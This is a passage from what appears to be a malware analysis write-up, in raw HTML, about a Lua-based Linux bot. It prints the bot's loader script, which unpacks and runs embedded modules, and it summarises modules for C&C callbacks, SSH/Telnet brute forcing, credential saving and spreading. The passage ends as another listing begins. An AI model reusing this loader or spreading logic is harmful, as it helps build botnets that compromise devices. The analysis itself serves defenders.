class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">dd </span><span class="crayon-e">offset </span><span class="crayon-e">getmods</span></div><div class="crayon-line" id="crayon-60581b86282d5504961658-11"><span class="crayon-e">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">dd </span><span class="crayon-e">offset </span><span class="crayon-i">aSetargs</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-s">"setargs"</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282d5504961658-12"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">dd </span><span class="crayon-e">offset </span><span class="crayon-v">setargs</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0002 seconds] -->

</div>
</div>
<div class="paragraph">
<p>The <code>getmods</code> method will return the archive blob as we will explain later. Then hardcoded Lua code (<code>malware.lua</code>) is executed via the <a href="http://pgl.yoyo.org/luai/i/luaL_loadstring" target="_blank" rel="noopener"><code>luaL_loadstring</code></a> and <a href="http://pgl.yoyo.org/luai/i/lua_pcall" target="_blank" rel="noopener"><code>lua_pcall</code></a> functions. The Lua code is quite straightforward, but here is a quick walkthrough of the source code without any modifications on our part.</p>
</div>
<div class="listingblock">
<div class="title"><strong>malware.lua</strong></div>
</div>
<div>
<!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60581b86282d6172532539" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
local unistd=require("posix.unistd")
require("malware")

function getexe()
    local fn=unistd.readlink("/proc/self/exe")
    if fn==nil and arg~=nil then
        fn=arg[0] --symlink removed
    end

    if fn==nil then
        print("couldn't find bot file")
        return nil
    end


    local file=io.open(fn,"r")
    if file==nil then
        print("couldn't find bot file")
        return nil
    end
    local data=file:read("*all")
    file:close()
    return data
end

function getMods()
    return zlib.inflate()(malware.getmods())
end

function getScriptFiles(scripts)
    local files={}
    local i=1
    while true do
        local a1,b1,c1=string.find(scripts,'%-%-script%-begin%-%-([%w%.]+)%-%-',i)
        if a1==nil then
            break
        end

        local a2,b2,c2=string.find(scripts,'%-%-script%-end%-%-([%w%.]+)%-%-',i)

        if a2==nil then
            break
        end

        if c1~=c2 then
            return nil
        end

        local src=string.sub(scripts,b1+1,a2-1)
        i=b2+1
        files[c1]=src
    end
    return files
end

malware.exe=getexe() 1
local modules=getScriptFiles(getMods()) 2

[...]

f=load(malware.modules['main.lua']) 3
local s,err=pcall(f)
if s==false then
    print(err)
end</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60581b86282d6172532539-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282d6172532539-2">2</div><div class="crayon-num" data-line="crayon-60581b86282d6172532539-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282d6172532539-4">4</div><div class="crayon-num" data-line="crayon-60581b86282d6172532539-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282d6172532539-6">6</div><div class="crayon-num" data-line="crayon-60581b86282d6172532539-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282d6172532539-8">8</div><div class="crayon-num" data-line="crayon-60581b86282d6172532539-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282d6172532539-10">10</div><div class="crayon-num" data-line="crayon-60581b86282d6172532539-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282d6172532539-12">12</div><div class="crayon-num" data-line="crayon-60581b86282d6172532539-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282d6172532539-14">14</div><div class="crayon-num" data-line="crayon-60581b86282d6172532539-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282d6172532539-16">16</div><div class="crayon-num" data-line="crayon-60581b86282d6172532539-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282d6172532539-18">18</div><div class="crayon-num" data-line="crayon-60581b86282d6172532539-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282d6172532539-20">20</div><div class="crayon-num" data-line="crayon-60581b86282d6172532539-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282d6172532539-22">22</div><div class="crayon-num" data-line="crayon-60581b86282d6172532539-23">23</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282d6172532539-24">24</div><div class="crayon-num" data-line="crayon-60581b86282d6172532539-25">25</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282d6172532539-26">26</div><div class="crayon-num" data-line="crayon-60581b86282d6172532539-27">27</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282d6172532539-28">28</div><div class="crayon-num" data-line="crayon-60581b86282d6172532539-29">29</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282d6172532539-30">30</div><div class="crayon-num" data-line="crayon-60581b86282d6172532539-31">31</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282d6172532539-32">32</div><div class="crayon-num" data-line="crayon-60581b86282d6172532539-33">33</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282d6172532539-34">34</div><div class="crayon-num" data-line="crayon-60581b86282d6172532539-35">35</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282d6172532539-36">36</div><div class="crayon-num" data-line="crayon-60581b86282d6172532539-37">37</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282d6172532539-38">38</div><div class="crayon-num" data-line="crayon-60581b86282d6172532539-39">39</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282d6172532539-40">40</div><div class="crayon-num" data-line="crayon-60581b86282d6172532539-41">41</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282d6172532539-42">42</div><div class="crayon-num" data-line="crayon-60581b86282d6172532539-43">43</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282d6172532539-44">44</div><div class="crayon-num" data-line="crayon-60581b86282d6172532539-45">45</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282d6172532539-46">46</div><div class="crayon-num" data-line="crayon-60581b86282d6172532539-47">47</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282d6172532539-48">48</div><div class="crayon-num" data-line="crayon-60581b86282d6172532539-49">49</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282d6172532539-50">50</div><div class="crayon-num" data-line="crayon-60581b86282d6172532539-51">51</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282d6172532539-52">52</div><div class="crayon-num" data-line="crayon-60581b86282d6172532539-53">53</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282d6172532539-54">54</div><div class="crayon-num" data-line="crayon-60581b86282d6172532539-55">55</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282d6172532539-56">56</div><div class="crayon-num" data-line="crayon-60581b86282d6172532539-57">57</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282d6172532539-58">58</div><div class="crayon-num" data-line="crayon-60581b86282d6172532539-59">59</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282d6172532539-60">60</div><div class="crayon-num" data-line="crayon-60581b86282d6172532539-61">61</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282d6172532539-62">62</div><div class="crayon-num" data-line="crayon-60581b86282d6172532539-63">63</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282d6172532539-64">64</div><div class="crayon-num" data-line="crayon-60581b86282d6172532539-65">65</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60581b86282d6172532539-1"><span class="crayon-e">local </span><span class="crayon-v">unistd</span><span class="crayon-o">=</span><span class="crayon-e">require</span><span class="crayon-sy">(</span><span class="crayon-s">"posix.unistd"</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282d6172532539-2"><span class="crayon-e">require</span><span class="crayon-sy">(</span><span class="crayon-s">"malware"</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-60581b86282d6172532539-3">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282d6172532539-4"><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-e">getexe</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-60581b86282d6172532539-5"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">local </span><span class="crayon-v">fn</span><span class="crayon-o">=</span><span class="crayon-v">unistd</span><span class="crayon-sy">.</span><span class="crayon-e">readlink</span><span class="crayon-sy">(</span><span class="crayon-s">"/proc/self/exe"</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282d6172532539-6"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-v">fn</span><span class="crayon-o">==</span><span class="crayon-e">nil </span><span class="crayon-st">and</span><span class="crayon-h"> </span><span class="crayon-v">arg</span><span class="crayon-o">~</span><span class="crayon-o">=</span><span class="crayon-e">nil </span><span class="crayon-st">then</span></div><div class="crayon-line" id="crayon-60581b86282d6172532539-7"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">fn</span><span class="crayon-o">=</span><span class="crayon-v">arg</span><span class="crayon-sy">[</span><span class="crayon-cn">0</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">--</span><span class="crayon-e">symlink </span><span class="crayon-e">removed</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282d6172532539-8"><span class="crayon-e">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">end</span></div><div class="crayon-line" id="crayon-60581b86282d6172532539-9">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282d6172532539-10"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-v">fn</span><span class="crayon-o">==</span><span class="crayon-e">nil </span><span class="crayon-st">then</span></div><div class="crayon-line" id="crayon-60581b86282d6172532539-11"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">print</span><span class="crayon-sy">(</span><span class="crayon-s">"couldn't find bot file"</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282d6172532539-12"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-e">nil</span></div><div class="crayon-line" id="crayon-60581b86282d6172532539-13"><span class="crayon-e">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">end</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282d6172532539-14">&nbsp;</div><div class="crayon-line" id="crayon-60581b86282d6172532539-15">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282d6172532539-16"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">local </span><span class="crayon-v">file</span><span class="crayon-o">=</span><span class="crayon-v">io</span><span class="crayon-sy">.</span><span class="crayon-e">open</span><span class="crayon-sy">(</span><span class="crayon-v">fn</span><span class="crayon-sy">,</span><span class="crayon-s">"r"</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-60581b86282d6172532539-17"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-v">file</span><span class="crayon-o">==</span><span class="crayon-e">nil </span><span class="crayon-st">then</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282d6172532539-18"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">print</span><span class="crayon-sy">(</span><span class="crayon-s">"couldn't find bot file"</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-60581b86282d6172532539-19"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-e">nil</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282d6172532539-20"><span class="crayon-e">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">end</span></div><div class="crayon-line" id="crayon-60581b86282d6172532539-21"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">local </span><span class="crayon-v">data</span><span class="crayon-o">=</span><span class="crayon-v">file</span><span class="crayon-o">:</span><span class="crayon-e">read</span><span class="crayon-sy">(</span><span class="crayon-s">"*all"</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282d6172532539-22"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">file</span><span class="crayon-o">:</span><span class="crayon-e">close</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-60581b86282d6172532539-23"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-e">data</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282d6172532539-24"><span class="crayon-st">end</span></div><div class="crayon-line" id="crayon-60581b86282d6172532539-25">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282d6172532539-26"><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-e">getMods</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-60581b86282d6172532539-27"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-v">zlib</span><span class="crayon-sy">.</span><span class="crayon-e">inflate</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">(</span><span class="crayon-v">malware</span><span class="crayon-sy">.</span><span class="crayon-e">getmods</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282d6172532539-28"><span class="crayon-st">end</span></div><div class="crayon-line" id="crayon-60581b86282d6172532539-29">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282d6172532539-30"><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-e">getScriptFiles</span><span class="crayon-sy">(</span><span class="crayon-v">scripts</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-60581b86282d6172532539-31"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">local </span><span class="crayon-v">files</span><span class="crayon-o">=</span><span class="crayon-sy">{</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282d6172532539-32"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">local</span><span class="crayon-h"> </span><span class="crayon-v">i</span><span class="crayon-o">=</span><span class="crayon-cn">1</span></div><div class="crayon-line" id="crayon-60581b86282d6172532539-33"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">while</span><span class="crayon-h"> </span><span class="crayon-t">true</span><span class="crayon-h"> </span><span class="crayon-st">do</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282d6172532539-34"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">local </span><span class="crayon-v">a1</span><span class="crayon-sy">,</span><span class="crayon-v">b1</span><span class="crayon-sy">,</span><span class="crayon-v">c1</span><span class="crayon-o">=</span><span class="crayon-t">string</span><span class="crayon-sy">.</span><span class="crayon-e">find</span><span class="crayon-sy">(</span><span class="crayon-v">scripts</span><span class="crayon-sy">,</span><span class="crayon-s">'%-%-script%-begin%-%-([%w%.]+)%-%-'</span><span class="crayon-sy">,</span><span class="crayon-v">i</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-60581b86282d6172532539-35"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-v">a1</span><span class="crayon-o">==</span><span class="crayon-e">nil </span><span class="crayon-st">then</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282d6172532539-36"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">break</span></div><div class="crayon-line" id="crayon-60581b86282d6172532539-37"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">end</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282d6172532539-38">&nbsp;</div><div class="crayon-line" id="crayon-60581b86282d6172532539-39"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">local </span><span class="crayon-v">a2</span><span class="crayon-sy">,</span><span class="crayon-v">b2</span><span class="crayon-sy">,</span><span class="crayon-v">c2</span><span class="crayon-o">=</span><span class="crayon-t">string</span><span class="crayon-sy">.</span><span class="crayon-e">find</span><span class="crayon-sy">(</span><span class="crayon-v">scripts</span><span class="crayon-sy">,</span><span class="crayon-s">'%-%-script%-end%-%-([%w%.]+)%-%-'</span><span class="crayon-sy">,</span><span class="crayon-v">i</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282d6172532539-40">&nbsp;</div><div class="crayon-line" id="crayon-60581b86282d6172532539-41"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-v">a2</span><span class="crayon-o">==</span><span class="crayon-e">nil </span><span class="crayon-st">then</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282d6172532539-42"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">break</span></div><div class="crayon-line" id="crayon-60581b86282d6172532539-43"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">end</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282d6172532539-44">&nbsp;</div><div class="crayon-line" id="crayon-60581b86282d6172532539-45"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-v">c1</span><span class="crayon-o">~</span><span class="crayon-o">=</span><span class="crayon-e">c2 </span><span class="crayon-st">then</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282d6172532539-46"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-e">nil</span></div><div class="crayon-line" id="crayon-60581b86282d6172532539-47"><span class="crayon-e">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">end</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282d6172532539-48">&nbsp;</div><div class="crayon-line" id="crayon-60581b86282d6172532539-49"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">local </span><span class="crayon-v">src</span><span class="crayon-o">=</span><span class="crayon-t">string</span><span class="crayon-sy">.</span><span class="crayon-e">sub</span><span class="crayon-sy">(</span><span class="crayon-v">scripts</span><span class="crayon-sy">,</span><span class="crayon-v">b1</span><span class="crayon-o">+</span><span class="crayon-cn">1</span><span class="crayon-sy">,</span><span class="crayon-v">a2</span><span class="crayon-o">-</span><span class="crayon-cn">1</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282d6172532539-50"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">i</span><span class="crayon-o">=</span><span class="crayon-v">b2</span><span class="crayon-o">+</span><span class="crayon-cn">1</span></div><div class="crayon-line" id="crayon-60581b86282d6172532539-51"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">files</span><span class="crayon-sy">[</span><span class="crayon-v">c1</span><span class="crayon-sy">]</span><span class="crayon-o">=</span><span class="crayon-e">src</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282d6172532539-52"><span class="crayon-e">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">end</span></div><div class="crayon-line" id="crayon-60581b86282d6172532539-53"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-e">files</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282d6172532539-54"><span class="crayon-st">end</span></div><div class="crayon-line" id="crayon-60581b86282d6172532539-55">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282d6172532539-56"><span class="crayon-v">malware</span><span class="crayon-sy">.</span><span class="crayon-v">exe</span><span class="crayon-o">=</span><span class="crayon-e">getexe</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-cn">1</span></div><div class="crayon-line" id="crayon-60581b86282d6172532539-57"><span class="crayon-e">local </span><span class="crayon-v">modules</span><span class="crayon-o">=</span><span class="crayon-e">getScriptFiles</span><span class="crayon-sy">(</span><span class="crayon-e">getMods</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-cn">2</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282d6172532539-58">&nbsp;</div><div class="crayon-line" id="crayon-60581b86282d6172532539-59"><span class="crayon-sy">[</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">]</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282d6172532539-60">&nbsp;</div><div class="crayon-line" id="crayon-60581b86282d6172532539-61"><span class="crayon-v">f</span><span class="crayon-o">=</span><span class="crayon-e">load</span><span class="crayon-sy">(</span><span class="crayon-v">malware</span><span class="crayon-sy">.</span><span class="crayon-v">modules</span><span class="crayon-sy">[</span><span class="crayon-s">'main.lua'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-cn">3</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282d6172532539-62"><span class="crayon-i">local</span><span class="crayon-h"> </span><span class="crayon-v">s</span><span class="crayon-sy">,</span><span class="crayon-v">err</span><span class="crayon-o">=</span><span class="crayon-e">pcall</span><span class="crayon-sy">(</span><span class="crayon-v">f</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-60581b86282d6172532539-63"><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-v">s</span><span class="crayon-o">==</span><span class="crayon-t">false</span><span class="crayon-h"> </span><span class="crayon-st">then</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282d6172532539-64"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">print</span><span class="crayon-sy">(</span><span class="crayon-v">err</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-60581b86282d6172532539-65"><span class="crayon-st">end</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0009 seconds] -->

</div>
</div>
</div>
<div class="sect1">
<div class="sectionbody">
<div class="colist arabic">
<table>
<tbody>
<tr>
<td><b>(1)</b></td>
<td>open the malware executable file from <code>/proc/self/exe</code> and return its content;</td>
</tr>
<tr>
<td><b>(2)</b></td>
<td>retrieve the <a href="http://www.zlib.net" target="_blank" rel="noopener">zlib</a> archive via <code>getmods</code> method, decompresses it, then parse it using tags and store it in a Lua’s array;</td>
</tr>
<tr>
<td><b>(3)</b></td>
<td>call <code>main.lua</code> module;</td>
</tr>
</tbody>
</table>
</div>
<div class="paragraph">
<p>There is an exhaustive list of all Lua scripts found in the IoCs section. Most of them have self-explanatory filenames, but here is a brief summary of some of them.</p>
</div>
<div class="paragraph">
<p><strong>callhome.lua</strong></p>
</div>
<div class="ulist">
<ul>
<li>retrieve the configuration file <code>server.bt</code> or <code>servers</code> from <code>config.lua</code>;</li>
<li>if unable to reach the current default server, change to a different server;</li>
<li>send files (reports or accounts, both JSON formatted);</li>
<li>execute tasks from task list retrieved from the C&amp;C server;</li>
</ul>
</div>
<div class="paragraph">
<p><strong>bfssh.lua</strong> / <strong>bftelnet.lua</strong></p>
</div>
<div class="ulist">
<ul>
<li>module to bruteforce SSH and Telnet logins;</li>
<li>check if the command <code>echo -en "\\x31\\x33\\x33\\x37"</code> outputs <code>1337</code>; if not, exit else continue;</li>
<li>device architecture is determined from the <code>/bin/ls</code> file by running <code>cat /bin/ls</code> and parsing the <a href="https://en.wikipedia.org/wiki/Executable_and_Linkable_Format" target="_blank" rel="noopener">ELF</a> header, see below;</li>
<li>spread the malware (both <code>.lm</code> and <code>.dm</code> files) according to the device architecture;</li>
<li>save successful credentials;</li>
</ul>
</div>
<div class="paragraph">
<p>The architecture checking code is as follows:</p>
</div>
<div class="listingblock">
<div class="title">bfssh.lua, getArchELF method</div>
</div>
</div>
</div>
<div>
<!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60581b86282d8664343156" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
function bfssh.getArchELF(text)
